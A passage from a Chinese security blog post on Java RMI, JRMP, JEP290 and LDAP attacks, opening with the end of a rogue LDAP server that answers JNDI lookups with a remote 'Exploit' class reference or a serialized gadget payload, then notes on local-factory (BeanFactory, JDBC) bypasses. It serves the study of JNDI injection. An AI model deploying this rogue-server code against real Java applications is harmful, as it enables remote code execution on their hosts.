&#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         * * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span> <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Exploit&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Payload1: 利用LDAP+Reference Factory  </span></span><br><span class="line"><span class="comment">//            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);  </span></span><br><span class="line"><span class="comment">//            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);  </span></span><br><span class="line"><span class="comment">//            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());  </span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// Payload2: 返回序列化Gadget</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, ReflectTools.ser2bytes(PayloadGen.getPayload()));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ParseException exception) &#123;</span><br><span class="line">                exception.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="本地工厂绕过"><a href="#本地工厂绕过" class="headerlink" title="本地工厂绕过"></a>本地工厂绕过</h2><p>原理就是，jndi lookup最终都会从reference里拿到工厂类，然后执行factory.getObjectInstance。而不同的本地工厂，能实现不同的利用。</p>
+<p>当jdk&gt;8u121和&gt;8u191时，远程加载工厂类用不了，但是可以找一个能够利用的本地工厂。一般就是找BeanFactory。</p>
+<p>这里不展开讲了，打法有很多，可以看：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/" >https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://tttang.com/archive/1405/#toc_0x01-beanfactory" >https://tttang.com/archive/1405/#toc_0x01-beanfactory<i class="fas fa-external-link-alt"></i></a></p>
+<p>当然，除了BeanFactory，还有大量的JDBC连接依赖也实现了ObjectFactory接口，能实现JNDI到JDBC的组合拳：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762693941356-d98cc5c4-d7ab-4e54-b6b9-6f3604cc315d.png"  alt="img"></p>
+<p>这里也不展开了，有兴趣的可以看看我之前的博客（1diot9.github.io），或者是看看这几道题：</p>
+<p>软件安全赛初赛2025 JDBCParty，NCTF25 H2Revenge，N1CTF junior2024 Derby DerbyPlus。</p>
+<p>在JNDI打JDBC时，有两种方法去加载本地工厂。一种是以 javaSerializedData 字段进行反序列化，可通过反序列化 Reference 对象进行其他姿势利用；另一种在高版本JDK中能绕过 javaSerializedData 字段反序列化限制，正常提供 Reference 对象，可以理解为 JNDIReferencePayload 更加兼容的版本。</p>
+<p>这两种在java-chains里都有提供：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762694447264-cdb5527c-27ba-4c8f-aaa5-82c3982bc165.png"  alt="img"></p>
+<p>上面那个JNDIResourceRefPayload是专门用于BeanFactory工厂的。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link"   target="_blank" rel="noopener" href="https://forum.butian.net/share/2278" >奇安信攻防社区-JAVA JRMP、RMI、JNDI、反序列化漏洞之间的风花雪月<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/257452" >RMI-攻击方式总结-安全KER - 安全资讯平台<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/259059#h2-0" >RMI-JEP290的分析与绕过-安全KER - 安全资讯平台<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15240" >JRMP通信攻击过程及利用介绍-先知社区<i class="fas fa-external-link-alt"></i></a></p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                RMI JRMP JEP290 LDAP基础梳理
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2025/11/10/RMI-JRMP-JEP290-LDAP基础梳理/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">1diot9</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2025-11-10 16:08</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/11/03/%E5%A5%91%E7%BA%A6%E9%94%81pdfverifier%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"
+                                   title="契约锁pdfverifier漏洞分析"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">契约锁pdfverifier漏洞分析</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RMI%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">RMI通信流程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RMI%E7%AE%80%E4%BB%8B"><span class="nav-number">2.1.</span> <span class="nav-text">RMI简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Registry%E5%88%9B%E5%BB%BA"><span class="nav-number">2.2.</span> <span class="nav-text">Registry创建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Server%E7%BB%91%E5%AE%9A%E5%AF%B9%E8%B1%A1"><span class="nav-number">2.3.</span> <span class="nav-text">Server绑定对象</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bind"><span class="nav-number">2.3.1.</span> <span class="nav-text">bind</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DGC"><span class="nav-number">2.3.2.</span> <span class="nav-text">DGC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93"><span class="nav-number">2.3.3.</span> <span class="nav-text">反序列化小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Client%E6%9F%A5%E6%89%BE%E5%AF%B9%E8%B1%A1"><span class="nav-number">2.4.</span> <span class="nav-text">Client查找对象</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#lookup"><span class="nav-number">2.4.1.</span> <span class="nav-text">lookup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93-1"><span class="nav-number">2.4.2.</span> <span class="nav-text">反序列化小结</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RMI%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">RMI攻击演示&amp;源码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#bind-1"><span class="nav-number">3.1.</span> <span class="nav-text">bind</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">3.1.0.1.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">3.1.0.2.</span> <span class="nav-text">分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DGC%E4%BC%A0%E8%BE%93%E6%81%B6%E6%84%8F%E5%AF%B9%E8%B1%A1%EF%BC%88JRMP%E6%94%BB%E5%87%BB%EF%BC%89"><span class="nav-number">3.2.</span> <span class="nav-text">DGC传输恶意对象（JRMP攻击）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-number">3.3.</span> <span class="nav-text">其他</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#jdk%E9%AB%98%E7%89%88%E6%9C%AC%E4%BF%AE%E5%A4%8D-%E7%BB%95%E8%BF%87"><span class="nav-number">4.</span> <span class="nav-text">jdk高版本修复&amp;绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%93%E4%B8%8D%E4%BA%86registry"><span class="nav-number">4.1.</span> <span class="nav-text">打不了registry</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87JEP290%EF%BC%888u121-8u230%EF%BC%89"><span class="nav-number">4.2.</span> <span class="nav-text">绕过JEP290（8u121~8u230）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D"><span class="nav-number">4.2.0.1.</span> <span class="nav-text">修复</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87JEP290%EF%BC%888u231-8u240%EF%BC%89"><span class="nav-number">4.3.</span> <span class="nav-text">绕过JEP290（8u231~8u240）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8Bcodebase%E5%A4%B1%E6%95%88"><span class="nav-number">4.4.</span> <span class="nav-text">远程codebase失效</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#jndi%E6%89%93client"><span class="nav-number">5.</span> <span class="nav-text">jndi打client</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RMI"><span class="nav-number">5.1.</span> <span class="nav-text">RMI</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Registry%E8%BF%94%E5%9B%9E%E6%81%B6%E6%84%8Fstub"><span class="nav-number">5.1.1.</span> <span class="nav-text">Registry返回恶意stub</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#codebase%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-number">5.1.2.</span> <span class="nav-text">codebase加载字节码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LDAP"><span class="nav-number">5.2.</span> <span class="nav-text">LDAP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#codebase%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81-1"><span class="nav-number">5.2.1.</span> <span class="nav-text">codebase加载字节码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%94%E5%9B%9E%E6%81%B6%E6%84%8F%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE"><span class="nav-number">5.2.2.</span> <span class="nav-text">返回恶意序列化数据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E5%B7%A5%E5%8E%82%E7%BB%95%E8%BF%87"><span class="nav-number">5.3.</span> <span class="nav-text">本地工厂绕过</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;2025
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">1diot9</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
+            
+        </div>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">91.7k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RMI%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">RMI通信流程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RMI%E7%AE%80%E4%BB%8B"><span class="nav-number">2.1.</span> <span class="nav-text">RMI简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Registry%E5%88%9B%E5%BB%BA"><span class="nav-number">2.2.</span> <span class="nav-text">Registry创建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Server%E7%BB%91%E5%AE%9A%E5%AF%B9%E8%B1%A1"><span class="nav-number">2.3.</span> <span class="nav-text">Server绑定对象</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bind"><span class="nav-number">2.3.1.</span> <span class="nav-text">bind</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DGC"><span class="nav-number">2.3.2.</span> <span class="nav-text">DGC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93"><span class="nav-number">2.3.3.</span> <span class="nav-text">反序列化小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Client%E6%9F%A5%E6%89%BE%E5%AF%B9%E8%B1%A1"><span class="nav-number">2.4.</span> <span class="nav-text">Client查找对象</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#lookup"><span class="nav-number">2.4.1.</span> <span class="nav-text">lookup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93-1"><span class="nav-number">2.4.2.</span> <span class="nav-text">反序列化小结</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RMI%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">RMI攻击演示&amp;源码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#bind-1"><span class="nav-number">3.1.</span> <span class="nav-text">bind</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">3.1.0.1.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">3.1.0.2.</span> <span class="nav-text">分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DGC%E4%BC%A0%E8%BE%93%E6%81%B6%E6%84%8F%E5%AF%B9%E8%B1%A1%EF%BC%88JRMP%E6%94%BB%E5%87%BB%EF%BC%89"><span class="nav-number">3.2.</span> <span class="nav-text">DGC传输恶意对象（JRMP攻击）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-number">3.3.</span> <span class="nav-text">其他</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#jdk%E9%AB%98%E7%89%88%E6%9C%AC%E4%BF%AE%E5%A4%8D-%E7%BB%95%E8%BF%87"><span class="nav-number">4.</span> <span class="nav-text">jdk高版本修复&amp;绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%93%E4%B8%8D%E4%BA%86registry"><span class="nav-number">4.1.</span> <span class="nav-text">打不了registry</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87JEP290%EF%BC%888u121-8u230%EF%BC%89"><span class="nav-number">4.2.</span> <span class="nav-text">绕过JEP290（8u121~8u230）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D"><span class="nav-number">4.2.0.1.</span> <span class="nav-text">修复</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87JEP290%EF%BC%888u231-8u240%EF%BC%89"><span class="nav-number">4.3.</span> <span class="nav-text">绕过JEP290（8u231~8u240）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8Bcodebase%E5%A4%B1%E6%95%88"><span class="nav-number">4.4.</span> <span class="nav-text">远程codebase失效</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#jndi%E6%89%93client"><span class="nav-number">5.</span> <span class="nav-text">jndi打client</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RMI"><span class="nav-number">5.1.</span> <span class="nav-text">RMI</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Registry%E8%BF%94%E5%9B%9E%E6%81%B6%E6%84%8Fstub"><span class="nav-number">5.1.1.</span> <span class="nav-text">Registry返回恶意stub</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#codebase%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-number">5.1.2.</span> <span class="nav-text">codebase加载字节码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LDAP"><span class="nav-number">5.2.</span> <span class="nav-text">LDAP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#codebase%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81-1"><span class="nav-number">5.2.1.</span> <span class="nav-text">codebase加载字节码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%94%E5%9B%9E%E6%81%B6%E6%84%8F%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE"><span class="nav-number">5.2.2.</span> <span class="nav-text">返回恶意序列化数据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E5%B7%A5%E5%8E%82%E7%BB%95%E8%BF%87"><span class="nav-number">5.3.</span> <span class="nav-text">本地工厂绕过</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
